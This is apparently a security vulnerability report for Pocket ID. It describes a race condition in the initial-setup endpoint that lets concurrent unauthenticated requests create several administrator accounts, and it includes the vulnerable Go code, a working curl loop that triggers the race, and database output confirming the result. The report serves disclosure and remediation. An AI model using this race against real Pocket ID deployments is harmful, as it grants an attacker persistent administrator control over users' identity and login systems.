title: Concurrent initial setup requests create multiple unauthenticated administrators
summary:
# Concurrent initial setup requests create multiple unauthenticated administrators

## Summary

`POST /api/signup/setup` is vulnerable to a time-of-check to time-of-use race on PostgreSQL. `SignUpInitialAdmin` starts a transaction, counts existing users, and creates an administrator when the count is zero. The transaction does not serialize this decision and there is no unique one-time setup marker.

Several concurrent unauthenticated requests can therefore all observe an empty user table and each create a different administrator. Every successful request also receives a valid Pocket ID browser session for its new administrator.

I reproduced this twice against the official `ghcr.io/pocket-id/pocket-id:v2` image, version `2.11.0`, with the official PostgreSQL configuration. The same vulnerable logic is still present on `main` at commit `6e859de2dd55dfc59d9cde3fab5d7a9789c6aca9`.

This report is submitted in response to the Pocket ID $1,000 critical vulnerability challenge.

## Root cause

`backend/internal/usersignup/service.go` performs a separate read and write in a normal transaction:

```go
tx := s.db.Begin()

setupCompleted, err := s.isInitialAdminSetupCompleted(ctx, tx)
if setupCompleted {
    return model.User{}, "", &common.SetupNotAvailableError{}
}

user, err := s.userCreator.CreateUserInternal(ctx, config, userToCreate, false, tx)

err = tx.Commit().Error
```

`isInitialAdminSetupCompleted` only counts users:

```go
err := db.WithContext(ctx).Model(&model.User{}).
    Where("id != ?", common.StaticApiKeyUserID).
    Count(&userCount).Error

return userCount != 0, nil
```

Under PostgreSQL's default `READ COMMITTED` isolation, concurrent transactions can all complete the count before any of the new users commits. The users have different unique usernames and email addresses, so no database constraint makes the later inserts conflict.

## Reproduction

### Environment

- Pocket ID image: `ghcr.io/pocket-id/pocket-id:v2`
- Pocket ID version: `2.11.0`
- PostgreSQL image: `postgres:17-alpine`
- Fresh Pocket ID database
- The Pocket ID port was bound only to localhost

### Requests

The following sends 20 different setup requests at the same time:

```bash
for n in $(seq -w 1 20); do
  curl -sS \
    -o "/tmp/setup-$n.body" \
    -w "%{http_code}" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"raceadmin$n\",\"email\":\"race$n@example.invalid\",\"firstName\":\"Race\",\"lastName\":\"$n\"}" \
    http://127.0.0.1:21411/api/signup/setup \
    > "/tmp/setup-$n.code" &
done
wait
```

### Result

In the first run, requests `01`, `02`, `11`, and `18` all returned HTTP 200 with different user IDs and `"isAdmin": true`.

The authoritative database query confirmed four administrators:

```sql
SELECT username, is_admin, created_at
FROM users
ORDER BY created_at;
```

```text
raceadmin18 | true | 2026-07-23 22:12:05.996637+00
raceadmin02 | true | 2026-07-23 22:12:05.996826+00
raceadmin11 | true | 2026-07-23 22:12:05.996973+00
raceadmin01 | true | 2026-07-23 22:12:05.998432+00
```

I then reset the user state and repeated the test with 20 new identities. Requests `01`, `02`, `03`, and `18` again returned HTTP 200, and PostgreSQL again contained four distinct administrators.

Sequential requests behave correctly. Once one setup transaction commits, later requests are rejected. The issue is specifically the concurrent check and insert.

## Impact

An unauthenticated attacker who races the legitimate owner during first-time setup can obtain a persistent administrator account and a valid administrator session.

An administrator can manage users, passkeys, OIDC clients and secrets, API permissions, signup and one-time access tokens, application configuration, SCIM providers, and user groups.
